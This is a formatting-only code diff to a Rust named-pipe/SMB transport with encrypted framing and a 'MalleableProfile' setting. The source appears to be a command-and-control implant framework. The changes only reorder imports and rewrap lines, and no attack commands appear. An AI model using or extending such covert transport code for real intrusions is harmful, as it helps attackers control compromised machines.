@@ -37,18 +37,18 @@
 //! If the pipe is busy when connecting, the transport retries with exponential
 //! back-off (1 s initial, 30 s max, with jitter) up to a configurable limit.
 
-use common::lock::MutexExt;
 use anyhow::{anyhow, Result};
 use async_trait::async_trait;
 use common::config::MalleableProfile;
+use common::lock::MutexExt;
 use common::{CryptoSession, Message, Transport};
-use tracing::info;
-#[cfg(windows)]
-use tracing::warn;
 #[cfg(windows)]
 use std::time::Duration;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
+use tracing::info;
+#[cfg(windows)]
+use tracing::warn;
 
 const MAX_FRAME_BYTES: u32 = 16 * 1024 * 1024; // 16 MiB hard cap
 
@@ -557,7 +557,10 @@ impl Transport for SmbPipeTransport {
                 let plain = session
                     .decrypt(&buf)
                     .map_err(|e| anyhow!("smb-pipe: decrypt failed: {e:?}"))?;
-                Ok(bincode::serde::decode_from_slice(&plain, bincode::config::legacy()).map(|(v, _)| v)?)
+                Ok(
+                    bincode::serde::decode_from_slice(&plain, bincode::config::legacy())
+                        .map(|(v, _)| v)?,
+                )
             }
             #[cfg(windows)]
             Self::Pipe { pipe, session, .. } => {
@@ -590,7 +593,10 @@ impl Transport for SmbPipeTransport {
                 let plain = session
                     .decrypt(&buf)
                     .map_err(|e| anyhow!("smb-pipe: decrypt failed: {e:?}"))?;
-                Ok(bincode::serde::decode_from_slice(&plain, bincode::config::legacy()).map(|(v, _)| v)?)
+                Ok(
+                    bincode::serde::decode_from_slice(&plain, bincode::config::legacy())
+                        .map(|(v, _)| v)?,
+                )
             }
         }
     }
